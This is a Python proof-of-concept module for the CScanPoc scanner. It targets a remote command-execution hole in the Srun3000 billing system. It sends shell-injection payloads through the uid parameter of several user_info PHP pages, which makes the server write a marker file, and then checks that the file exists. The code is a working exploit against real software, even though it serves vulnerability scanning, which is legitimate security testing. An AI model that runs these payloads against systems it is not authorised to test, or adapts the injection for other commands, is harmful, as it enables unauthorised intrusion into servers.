# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Srun_0003' # 平台漏洞编号，留空
    name = 'Srun3000计费系统 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2014-03-01'  # 漏洞公布时间
    desc = '''
        Srun3000计费系统 /srun3/web/user_info.php 逻辑不严谨，导致命令执行漏洞。

    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '深澜深澜计费引擎'  # 漏洞应用名称
    product_version = 'Srun3000'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '11974e5a-aecd-4f61-a757-3535b1c87703'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #ref:http://wooyun.org/bugs/wooyun-2010-052191
            hh = hackhttp.hackhttp()
            pocs = [
                '/user_info.php?uid=;echo+\'testvul1\'+>>vul.php;',
                '/user_info_en.php?uid=;echo+\'testvul2\'+>>vul.php;',
                '/user_info1.php?uid=;echo+\'testvul3\'+>>vul.php;'
            ]
            for poc in pocs:
                poc = self.target + poc
                code, head, res, errcode, _ = hh.http(poc)
            verify = self.target + '/vul.php'
            code, head, res, errcode, _ = hh.http(verify)
            if 'testvul1' in res:
                #security_hole("Srun_3000 Gate RCE vulnerable!:"+arg+pocs[0])
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            if 'testvul2' in res:
                #security_hole("Srun_3000 Gate RCE vulnerable!:"+arg+pocs[1])
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            if 'testvul3' in res:
                #security_hole("Srun_3000 Gate RCE vulnerable!:"+arg+pocs[2])
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
